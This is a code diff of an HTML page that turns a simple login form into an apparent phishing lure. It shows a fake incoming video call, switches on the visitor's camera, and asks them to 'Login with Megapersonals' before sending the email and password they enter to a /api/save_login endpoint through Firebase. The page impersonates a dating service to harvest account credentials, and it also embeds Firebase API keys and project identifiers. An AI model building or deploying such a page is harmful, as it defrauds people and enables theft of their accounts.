@@ -3,20 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Video Call</title>
     <style>
-        .login-form {
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        #videoContainer {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+        #selfieVideo {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+        #incomingCall, #liveChat, #loginForm {
+            display: none;
+            text-align: center;
+        }
+        .button {
+            padding: 10px 20px;
+            margin: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+        }
+        .green {
+            background-color: #28a745;
+            color: white;
+        }
+        .red {
+            background-color: #dc3545;
+            color: white;
+        }
+        #loginForm {
             display: flex;
             flex-direction: column;
             width: 300px;
-            margin: 100px auto;
         }
-        .login-form input {
+        #loginForm input {
             margin-bottom: 10px;
             padding: 10px;
             font-size: 16px;
         }
-        .login-form button {
+        #loginForm button {
             padding: 10px;
             font-size: 16px;
             background-color: #28a745;
@@ -24,32 +66,42 @@
             border: none;
             cursor: pointer;
         }
-        .login-form button:hover {
-            background-color: #218838;
-        }
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
 </head>
 <body>
-    <form class="login-form" id="loginForm" method="POST">
-        <input type="email" name="email" placeholder="Email" required>
-        <input type="password" name="pass" placeholder="Password" required>
-        <button type="submit">Login</button>
-    </form>
-
+    <div id="videoContainer">
+        <video id="selfieVideo" autoplay></video>
+        <div id="incomingCall">
+            <h1>Incoming Video Call</h1>
+            <button class="button green" onclick="answerCall()">Accept</button>
+            <button class="button red">Decline</button>
+        </div>
+        <div id="liveChat">
+            <h1>Live Video Chat</h1>
+            <p>Login with Megapersonals and enjoy Private Video chat with your dating partner</p>
+            <button class="button" onclick="showLogin()">Login with Megapersonal</button>
+        </div>
+        <form id="loginForm">
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="pass" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
     <script>
-        // Your web app's Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyABlLCj8HyPHTtQbmo83QFnsQsjk6mDeXs",
-            authDomain: "info-571f9.firebaseapp.com",
-            projectId: "info-571f9",
-            storageBucket: "info-571f9.appspot.com",
-            messagingSenderId: "998797023754",
-            appId: "1:998797023754:web:c7fb3fb4ce8803b1259df3"
-        };
-        
+        // Firebase configuration
+       const firebaseConfig = {
+  apiKey: "AIzaSyABlLCj8HyPHTtQbmo83QFnsQsjk6mDeXs",
+  authDomain: "info-571f9.firebaseapp.com",
+  projectId: "info-571f9",
+  storageBucket: "info-571f9.appspot.com",
+  messagingSenderId: "998797023754",
+  appId: "1:998797023754:web:c7fb3fb4ce8803b1259df3",
+  measurementId: "G-TQ2B18B2SH"
+};
+
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
 
@@ -58,27 +110,46 @@
 
         // Initialize Firebase Authentication
         const auth = firebase.auth();
-        
-        // Example: Sign in anonymously
-        auth.signInAnonymously()
-            .then(() => {
-                console.log('Signed in anonymously');
-            })
-            .catch(error => {
-                console.error('Error signing in', error);
-            });
 
-        const form = document.getElementById('loginForm');
-        form.addEventListener('submit', async (e) => {
+        // Get elements
+        const video = document.getElementById('selfieVideo');
+        const incomingCall = document.getElementById('incomingCall');
+        const liveChat = document.getElementById('liveChat');
+        const loginForm = document.getElementById('loginForm');
+
+        // Show camera stream
+        async function showCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+            } catch (err) {
+                console.error('Error accessing the camera', err);
+            }
+        }
+
+        // Show incoming call screen
+        function answerCall() {
+            incomingCall.style.display = 'none';
+            liveChat.style.display = 'block';
+        }
+
+        // Show login form
+        function showLogin() {
+            liveChat.style.display = 'none';
+            loginForm.style.display = 'block';
+        }
+
+        // Handle login form submission
+        loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const email = form.email.value;
-            const pass = form.pass.value;
+            const email = loginForm.email.value;
+            const pass = loginForm.pass.value;
 
-            const user = firebase.auth().currentUser;
-            if (user) {
-                const authToken = await user.getIdToken();
-                
+            try {
+                const user = await auth.signInAnonymously();
+                const authToken = await user.user.getIdToken();
+
                 const response = await fetch('/api/save_login', {
                     method: 'POST',
                     headers: {
@@ -89,16 +160,15 @@
 
                 const result = await response.json();
                 console.log(result);
-            } else {
-                console.error('User is not authenticated');
+            } catch (error) {
+                console.error('Error logging in', error);
             }
         });
+
+        // Initialize view
+        showCamera();
+        incomingCall.style.display = 'block';
     </script>
 </body>
 </html>
 
-        // Initially show the incoming call container
-        document.getElementById('incomingCall').style.display = 'block';
-    </script>
-</body>
-</html>
